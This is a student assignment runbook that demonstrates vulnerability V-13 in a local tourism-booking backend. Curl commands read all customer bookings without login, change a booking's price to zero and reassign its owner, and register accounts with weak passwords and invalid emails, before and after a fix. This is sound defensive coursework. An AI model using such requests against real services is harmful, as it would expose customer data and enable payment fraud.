# V-13 — Attack commands for screenshots

Commands to run in the terminal to demonstrate the vulnerability. Copy-paste
each block, screenshot the output.

---

## Setup — switch to the vulnerable code

```bash
cd "D:/Projects Version2/SSD Assignment"
git stash push -m "demo" -- backend/controller backend/route backend/model
```

Start the server in **terminal 1** and leave it running:

```bash
cd "D:/Projects Version2/SSD Assignment/backend"
node index.js
```

Run everything below in **terminal 2**.

> If a result looks wrong, an old server is still holding the port. Check with
> `netstat -ano | findstr :4000` and stop that PID in Task Manager.

---

## ATTACK 1 — Read every customer's booking without logging in

```bash
echo "=== ATTACK 1: no login, no password ==="
curl http://localhost:4000/api/Booking
```

**Expected:** HTTP 200 with real booking records — customer names, phone
numbers, prices, dates.

---

## ATTACK 2 — Change a $349 booking to $0

Step 1, create a normal booking:

```bash
curl -X POST http://localhost:4000/api/Booking -H "Content-Type: application/json" -d "{\"name\":\"Sigiriya Tour\",\"booking_type\":\"hotel\",\"booking_date\":\"2026-02-01\",\"booking_time\":\"10:00\",\"start_date\":\"2026-02-10\",\"end_date\":\"2026-02-15\",\"mobile_number\":771234567,\"payID\":\"p1\",\"tourID\":\"t1\",\"payment_amount\":349,\"touristID\":\"real-customer\",\"B_Id\":\"b1\"}"
```

Copy the `bookingID` from the response, then step 2 — the attack:

```bash
curl -X PUT http://localhost:4000/api/Booking/PASTE_BOOKING_ID_HERE -H "Content-Type: application/json" -d "{\"payment_amount\":0,\"touristID\":\"attacker\"}"
```

Step 3, prove it changed:

```bash
curl http://localhost:4000/api/Booking/PASTE_BOOKING_ID_HERE
```

**Expected:** `payment_amount` is now `0` (was 349) and `touristID` is now
`attacker` (was `real-customer`).

---

## ATTACK 3 — Register with a one-character password

The React form requires 8+ characters. The server does not.

```bash
curl -X POST http://localhost:4000/api/touristregister -H "Content-Type: application/json" -d "{\"fullname\":\"Weak Password\",\"email\":\"weak-demo@test.com\",\"password\":\"1\",\"country\":\"LK\",\"mobile_number\":\"0771234567\"}"
```

**Expected:** HTTP 201, account created.

---

## ATTACK 4 — Register with an invalid email

```bash
curl -X POST http://localhost:4000/api/touristregister -H "Content-Type: application/json" -d "{\"fullname\":\"Bad Email\",\"email\":\"this-is-not-an-email\",\"password\":\"password123\",\"country\":\"LK\",\"mobile_number\":\"0771234567\"}"
```

**Expected:** HTTP 201, account created with a nonsense email address.

---

## Restore the fixed code

```bash
# Ctrl+C the server in terminal 1 first
cd "D:/Projects Version2/SSD Assignment"
git stash pop
cd backend
node index.js
```

Now run the same four attacks again for the "after" screenshots.

| Attack | Before | After |
| --- | --- | --- |
| 1 — read bookings, no login | 200 OK | 401 Unauthorized |
| 2 — set price to 0 | 349 → 0 | 401 Unauthorized |
| 3 — one-character password | 201 Created | 400 Bad Request |
| 4 — invalid email | 201 Created | 400 Bad Request |

---

## Clean up afterwards

```bash
cd "D:/Projects Version2/SSD Assignment/backend"
node -e "require('dotenv').config();const m=require('mongoose');m.connect(process.env.MONGO_URI).then(async()=>{const db=m.connection;await db.collection('users').deleteMany({email:/demo@test\.com$|^this-is-not-an-email$/});await db.collection('tourists').deleteMany({email:/demo@test\.com$|^this-is-not-an-email$/});await db.collection('bookings').deleteMany({touristID:{$in:['real-customer','attacker']}});console.log('cleaned');await m.disconnect();});"
```
